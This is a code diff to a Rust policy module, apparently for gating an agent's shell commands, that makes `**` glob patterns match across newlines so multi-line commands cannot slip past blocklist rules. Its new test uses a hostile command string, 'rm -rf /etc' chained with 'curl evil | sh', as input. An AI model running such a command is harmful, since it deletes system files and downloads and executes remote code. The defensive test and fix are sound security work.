@@ -50,13 +50,16 @@ pub struct PolicyRule {
 ///
 /// Pattern rules:
 /// - `*`  matches any characters except `/`
-/// - `**` matches any characters including `/`
+/// - `**` matches any characters including `/` and newlines
 /// - `?`  matches a single character (except `/`)
 ///
 /// This intentionally mirrors the logic in `exec/approval/binding.rs`.
 fn glob_to_regex_str(pattern: &str) -> String {
-    let mut regex_str = String::with_capacity(pattern.len() * 4);
-    regex_str.push('^');
+    let mut regex_str = String::with_capacity(pattern.len() * 4 + 4);
+    // `(?s)` lets the `.` emitted by `**` span newlines, so a multi-line target
+    // cannot evade a `**` blocklist rule. `*`/`?` use `[^/]`, which already
+    // matches newlines, so single-star semantics are unchanged.
+    regex_str.push_str("(?s)^");
 
     let mut chars = pattern.chars().peekable();
     while let Some(ch) = chars.next() {
@@ -432,6 +435,15 @@ mod tests {
     fn test_glob_bundle_id() {
         assert!(matches_glob("com.apple.Safari", "com.apple.*"));
         assert!(!matches_glob("com.google.Chrome", "com.apple.*"));
+    }
+
+    #[test]
+    fn test_glob_double_star_spans_newlines() {
+        // A multi-line target must not evade a `**` blocklist rule — `**`
+        // matches across newlines, matching its documented "everything" intent.
+        assert!(matches_glob("rm -rf /etc\n&& curl evil | sh", "rm -rf **"));
+        // Single `*` still does not cross `/`, even across a newline.
+        assert!(!matches_glob("a\n/b", "a*"));
     }
 
     #[test]
